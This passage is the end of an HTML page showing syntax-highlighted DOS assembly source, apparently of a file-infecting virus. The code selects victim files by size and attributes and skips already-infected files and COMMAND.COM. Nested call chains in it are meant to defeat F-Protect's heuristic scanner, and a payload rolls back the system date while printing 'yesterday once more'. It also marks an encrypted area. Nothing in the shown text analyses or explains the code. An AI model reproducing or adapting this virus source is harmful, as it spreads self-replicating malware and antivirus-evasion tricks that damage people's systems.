        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">                         </span><span class="sc1">; Function 1Ah=Set DTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">; reset old DTA to</span><span class="sc0">
                                                </span><span class="sc1">; DOS' default offset 80h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc2">6Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">EndOfSetDate</span><span class="sc0">                    </span><span class="sc1">; Set date just every</span><span class="sc0">
                                                </span><span class="sc1">; 128th time of run..</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;get date</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">;if day = 01.xx.xx, don't set</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">EndOfSetDate</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02bh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;set date to original-1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">message</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;output message to screen!</span><span class="sc0">

</span><span class="sc5">EndOfSetDate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;return to to host routine</span><span class="sc0">

</span><span class="sc5">checks</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewDta</span><span class="sc4">+</span><span class="sc2">015h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">031d</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">; files may have only</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close2</span><span class="sc0">                          </span><span class="sc1">; archive bit on...</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NewDta</span><span class="sc4">+</span><span class="sc2">01ah</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64000d</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">close2</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">122d</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">close2</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">readbuffer</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close2</span><span class="sc0">                          </span><span class="sc1">; Already Infected</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NEWDTA</span><span class="sc4">+</span><span class="sc2">35</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'DN'</span><span class="sc0"> </span><span class="sc1">; don't infect</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close2</span><span class="sc0">                               </span><span class="sc1">; COMMAND.COM</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">backfromcheck</span><span class="sc0">

</span><span class="sc5">screw_fprot</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">;  Nested calls to confuse</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw2</span><span class="sc0">                </span><span class="sc1">;  f-protect's heuristic</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw2</span><span class="sc0">                </span><span class="sc1">;  analysis</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw2</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw2</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw2</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">screw2</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw3</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw3</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">screw3</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw4</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw4</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">screw4</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">screw4</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">notshown_msg</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'[pepper] '</span><span class="sc0">
</span><span class="sc5">message</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'yesterday once more'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc1">;ENCRYPTED AREA END</span><span class="sc0">

</span><span class="sc5">TempShit</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc13">'\'
</span><span class="sc5">heap</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">DirString</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">             </span><span class="sc1">; original dir is saved here.</span><span class="sc0">
</span><span class="sc5">newdta</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">43</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">              </span><span class="sc1">; New Disk Transfer Access</span><span class="sc0">
</span><span class="sc5">readbuffer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">5h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">heap_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">duuh</span></div></body>
</html>
